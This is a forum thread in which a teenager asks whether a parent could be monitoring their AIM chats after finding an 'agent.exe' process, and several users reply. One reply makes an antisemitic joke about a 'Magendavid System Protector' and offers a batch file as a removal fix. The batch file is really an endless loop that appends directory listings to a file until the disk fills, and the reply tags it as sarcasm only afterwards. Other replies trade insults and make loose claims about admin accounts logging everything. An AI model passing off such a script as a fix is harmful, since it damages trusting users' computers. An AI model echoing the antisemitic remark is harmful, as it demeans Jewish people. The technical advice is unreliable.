channel.title: Raawwrrghhhhh this pisses me off
channel.description: I'm trying to figure this out, i am keep my laptop in my room and i use wireless internet. My dad told me he knows everything i'm doing on my computer and im like how do you know, he said he is monitoring my aim and that if i'm using 'language' i shouldn't be using, i should stop and im like thinking hell no. and a few days ago i went thru my processes and found a "agent.exe" running and it was running under my user not system or anything, i ended it and i haven't seen it since. Are there any programs that can do this? along the lines of typing etc. I don't think so and i have loads of protection on my computer.

item.title: Raawwrrghhhhh this pisses me off

item.description:
@swordskid61 wrote:

“OVERPROTECTIVE PARENTS”

item.title: Raawwrrghhhhh this pisses me off
item.dc:creator: @kloplop321 kloplop321
item.description:
@kloplop321 wrote:

lol… well to answer your real question, yes programs can do that. but aparently your father doesn’t care about privacy, you might as well tick him off by “since you break through my privacy, why don’t you just watch my go to the bathroom since you want to look into things so much”

Read full topic

Cryme Time:

I’m trying to figure this out, i am keep my laptop in my room and i use wireless internet. My dad told me he knows everything i’m doing on my computer and im like how do you know, he said he is monitoring my aim and that if i’m using ‘language’ i shouldn’t be using, i should stop and im like thinking hell no. and a few days ago i went thru my processes and found a “agent.exe” running and it was running under my user not system or anything, i ended it and i haven’t seen it since. Are there any programs that can do this? along the lines of typing etc. I don’t think so and i have loads of protection on my computer.

item.title: Raawwrrghhhhh this pisses me off
item.dc:creator: @xxlegitxx xxlegitxx
item.description:
@xxlegitxx wrote:

Chimaera God:

I had the same sort of problem with my stepdad until he and my mom got divorced. It could be that he has an administrator account on your computer. If he does, his account logs everything that everybody does on the computer, except for his account of course. If that’s not the case, your dad is just a dick.

I believe that is wrong.

Read full topic

item.title: Raawwrrghhhhh this pisses me off
item.dc:creator: @ilyaostr9 io9
item.description:
@ilyaostr9 wrote:

I think your dad is jewish. You can remove the Magendavid System Protector by putting this in a bat file and running it

init: 
echo Fixing
goto remove

:remove
tree >> remove.ex_

goto init

[/sarcasm]
Post a list running processes.
